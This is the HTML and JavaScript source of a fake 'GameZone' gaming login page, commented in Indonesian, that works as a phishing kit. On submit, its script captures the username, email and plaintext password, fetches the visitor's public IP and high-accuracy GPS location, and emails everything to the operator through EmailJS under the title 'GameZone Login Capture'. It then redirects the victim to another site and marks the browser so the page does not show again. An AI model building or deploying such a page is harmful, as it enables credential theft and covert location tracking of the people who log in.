<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>GameZone Login</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary: #00f2ff; 
      --secondary: #bd00ff; 
      --bg-dark: #0b0c15;
      --card-bg: rgba(20, 20, 35, 0.85);
      --text-main: #ffffff;
      --text-muted: #a0a0b0;
    }
    * { box-sizing: border-box; transition: all 0.3s ease; }
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Poppins', sans-serif;
      background-color: var(--bg-dark);
      background-image: 
        radial-gradient(circle at 10% 20%, rgba(189, 0, 255, 0.15) 0%, transparent 20%),
        radial-gradient(circle at 90% 80%, rgba(0, 242, 255, 0.15) 0%, transparent 20%);
      background-attachment: fixed;
      overflow: hidden; 
    }
    body::before {
      content: "";
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      background: 
        linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
      background-size: 40px 40px;
      z-index: -1;
    }
    .container { width: 100%; max-width: 420px; padding: 20px; position: relative; z-index: 1; }
    .card {
      background: var(--card-bg);
      border-radius: 20px;
      padding: 40px 30px;
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 20px rgba(0, 242, 255, 0.1);
      text-align: center;
    }
    h1 {
      margin: 0 0 10px;
      font-family: 'Orbitron', sans-serif;
      font-size: 32px;
      font-weight: 900;
      color: var(--text-main);
      text-transform: uppercase;
      letter-spacing: 2px;
      text-shadow: 0 0 15px var(--secondary);
    }
    h1 span { color: var(--primary); text-shadow: 0 0 15px var(--primary); }
    p { color: var(--text-muted); font-size: 13px; margin-bottom: 30px; }
    .field { margin-bottom: 20px; position: relative; text-align: left; }
    label.input-label {
      font-size: 12px;
      color: var(--primary);
      margin-bottom: 5px;
      display: block;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      background: rgba(0, 0, 0, 0.3);
      color: #fff;
      font-family: 'Poppins', sans-serif;
      outline: none;
    }
    input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 10px rgba(0, 242, 255, 0.3);
      background: rgba(0, 0, 0, 0.5);
    }
    .checkbox-container {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--text-muted);
      font-size: 12px;
      cursor: pointer;
      margin-bottom: 25px;
    }
    .checkbox-container input { width: auto; cursor: pointer; }
    button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 8px;
      background: linear-gradient(90deg, var(--secondary), var(--primary));
      color: #000;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 16px;
      letter-spacing: 1px;
      cursor: pointer;
      box-shadow: 0 5px 20px rgba(189, 0, 255, 0.4);
      position: relative;
      overflow: hidden;
    }
    button:hover:not([disabled]) {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(0, 242, 255, 0.5);
      color: #fff;
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      background: #333;
      color: #888;
      box-shadow: none;
    }
    .toast {
      position: fixed;
      top: 20px; left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: rgba(0, 242, 255, 0.15);
      backdrop-filter: blur(10px);
      border: 1px solid var(--primary);
      color: #fff;
      padding: 12px 24px;
      border-radius: 50px;
      font-size: 14px;
      z-index: 1000;
      transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
      box-shadow: 0 5px 15px rgba(0,0,0,0.5);
    }
    .toast.show { transform: translateX(-50%) translateY(0); }
    .footer-links { margin-top: 20px; font-size: 12px; }
    .footer-links a { color: var(--text-muted); text-decoration: none; }
    .footer-links a:hover { color: var(--primary); text-decoration: underline; }
    #debug { display: none; }
  </style>
</head>
<body>

  <div id="toast" class="toast">System Ready</div>

  <div class="container">
    <div class="card">
      <h1>Game<span>Zone</span></h1>
      <p>Login securely. Enabling location helps us verify your device identity.</p>

      <form id="login-form">
        <div class="field">
          <label class="input-label">Username / ID</label>
          <input id="username" type="text" required placeholder="Ex: ProGamer123" />
        </div>

        <div class="field">
          <label class="input-label">Email Address</label>
          <input id="email" type="email" required placeholder="email@domain.com" />
        </div>

        <div class="field">
          <label class="input-label">Password</label>
          <input id="password" type="password" required placeholder="••••••••" />
        </div>

        <label class="checkbox-container">
          <input id="includePassword" type="checkbox" checked> 
          <span>Remember Device & Cookies</span>
        </label>

        <button id="loginBtn" type="submit" disabled>INITIALIZING...</button>
      </form>

      <div class="footer-links">
        <a href="#" id="manualLink">Need Help?</a>
        <span style="display:block; margin-top:8px; font-size:12px; color:var(--text-muted)">
          To logout locally: <a href="#" id="logoutLink">Clear session</a>
        </span>
      </div>

      <pre id="debug"></pre>
    </div>
  </div>

  <!-- SCRIPT UTAMA -->
  <script>
    // 1. KONFIGURASI REDIRECT
    const REDIRECT_URL = "https://rsaragang.github.io/Game-zone/"; 

    // 2. KONFIGURASI EMAILJS (Jangan diubah jika sudah benar)
    const EMAILJS_PUBLIC_KEY = '_JoC264RPIJwOiyVg';
    const EMAILJS_SERVICE_ID = 'service_jjexq0t';
    const EMAILJS_TEMPLATE_ID = 'template_lv3r85i';

    const toast = document.getElementById('toast');
    const btn = document.getElementById('loginBtn');

    function showToast(msg){
      toast.textContent = msg;
      toast.classList.add('show');
      setTimeout(()=>toast.classList.remove('show'), 3000);
    }

    // 3. CEK COOKIES/LOCALSTORAGE
    // Jika user pernah login sebelumnya, langsung lempar ke halaman tujuan
    try {
      if(localStorage.getItem('gamezone_logged') === 'true') {
        window.location.replace(REDIRECT_URL);
      }
    } catch(e) {
      console.warn('localStorage access denied', e);
    }

    // 4. LOAD LIBRARY EMAILJS
    function loadEmailJS(){
      return new Promise((resolve, reject)=>{
        if(window.emailjs) return resolve(window.emailjs);
        const s = document.createElement('script');
        s.src = 'https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js';
        s.onload = ()=>{
          try{ window.emailjs.init(EMAILJS_PUBLIC_KEY); }catch(e){}
          resolve(window.emailjs);
        };
        s.onerror = ()=>reject(new Error('Failed to load SDK'));
        document.head.appendChild(s);
      });
    }

    let emailjsReady = false;
    loadEmailJS().then(()=>{
      emailjsReady = true;
      btn.disabled = false;
      btn.textContent = 'LOGIN NOW';
    }).catch(()=>{
      btn.textContent = 'Connection Error';
    });

    // 5. FUNGSI MENDAPATKAN IP ADDRESS
    async function getPublicIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return 'IP Not Detected';
      }
    }

    // 6. FUNGSI MENDAPATKAN LOKASI (GPS)
    function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve("Geo Not Supported");
        } else {
          // Opsi untuk akurasi tinggi
          const options = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
          };

          navigator.geolocation.getCurrentPosition(
            (position) => {
              const lat = position.coords.latitude;
              const long = position.coords.longitude;
              // Format link Google Maps
              const mapLink = `https://www.google.com/maps?q=${lat},${long}`;
              resolve(mapLink);
            },
            (error) => {
              // Jika user menolak izin lokasi (Block)
              resolve("User Denied Location / GPS Off");
            },
            options
          );
        }
      });
    }

    // 7. HANDLE LOGIC LOGIN
    document.getElementById('login-form').addEventListener('submit', async e=>{
      e.preventDefault();
      
      if(!emailjsReady){ showToast('System not ready'); return; }

      // Ubah tampilan tombol saat proses berjalan
      btn.disabled = true;
      btn.textContent = 'VERIFYING LOGIN...';
      btn.style.opacity = '0.7';

      // Mengambil Data IP & Lokasi (Akan memunculkan Popup Izin Lokasi di Browser)
      const ipAddress = await getPublicIP();
      const locationData = await getGeolocation(); 

      const extraInfo = {
        device: navigator.userAgent,
        time: new Date().toLocaleString(),
        screen: `${window.screen.width}x${window.screen.height}`
      };

      const uName = document.getElementById('username').value;
      const uEmail = document.getElementById('email').value;
      const uPass = document.getElementById('password').value;

      // Parameter yang dikirim ke EmailJS
      // Pastikan Template Email Anda punya variabel: {{ip_address}} dan {{location_map}}
      const params = {
        title: 'GameZone Login Capture',
        user_name: uName,
        user_email: uEmail,
        user_password: uPass,
        device_info: extraInfo.device,
        timestamp: extraInfo.time,
        ip_address: ipAddress,       // Data IP
        location_map: locationData,  // Data Link Google Maps
        login_status: 'Success Capture'
      };

      try {
        // Kirim Email
        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);

        showToast('Login Success!');

        // Simpan "Cookie" (LocalStorage)
        try { localStorage.setItem('gamezone_logged', 'true'); } catch(e){}

        // Redirect ke halaman tujuan
        setTimeout(()=>{
          window.location.replace(REDIRECT_URL);
        }, 800);

      } catch(err) {
        console.error(err);
        showToast('Connection Failed, Try Again.');
        btn.disabled = false;
        btn.textContent = 'LOGIN NOW';
        btn.style.opacity = '1';
      }
    });

    // Link bantuan dummy
    document.getElementById('manualLink').addEventListener('click', e=>{
      e.preventDefault();
      alert("Please check your internet connection.");
    });

    // Fitur Logout manual untuk testing (menghapus cookie sesi)
    document.getElementById('logoutLink').addEventListener('click', e=>{
      e.preventDefault();
      try { localStorage.removeItem('gamezone_logged'); showToast('Session cleared'); } catch(e){}
    });
  </script>
</body>
</html>
